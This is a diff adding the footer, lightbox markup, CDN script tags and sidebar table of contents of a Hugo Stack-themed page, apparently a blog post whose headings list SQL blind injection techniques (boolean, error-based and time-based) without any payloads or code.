+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#blind-injection">Blind injection</a>
+      <ol>
+        <li><a href="#布尔盲注">布尔盲注</a>
+          <ol>
+            <li><a href="#left"><code>left()</code></a></li>
+            <li><a href="#substr-ascii"><code>substr()</code> <code>ascii()</code></a></li>
+            <li><a href="#regexp"><code>regexp</code></a></li>
+            <li><a href="#like-匹配注入"><code>like</code> 匹配注入</a></li>
+            <li><a href="#ord-and-mid"><code>ORD()</code> and <code>MID()</code></a></li>
+          </ol>
+        </li>
+        <li><a href="#报错盲注">报错盲注</a>
+          <ol>
+            <li><a href="#bigint数据类型溢出报错注入">BigInt数据类型溢出报错注入</a></li>
+            <li><a href="#参数格式错误">参数格式错误</a></li>
+            <li><a href="#主键重复">主键重复</a></li>
+          </ol>
+        </li>
+        <li><a href="#时间盲注">时间盲注</a>
+          <ol>
+            <li><a href="#sleep"><code>sleep()</code></a></li>
+            <li><a href="#benchmark">benchmark()</a></li>
+            <li><a href="#笛卡尔积-heavy-query">笛卡尔积（heavy query）</a></li>
+            <li><a href="#get-lock">GET_LOCK</a></li>
+            <li><a href="#正则bug">正则bug</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
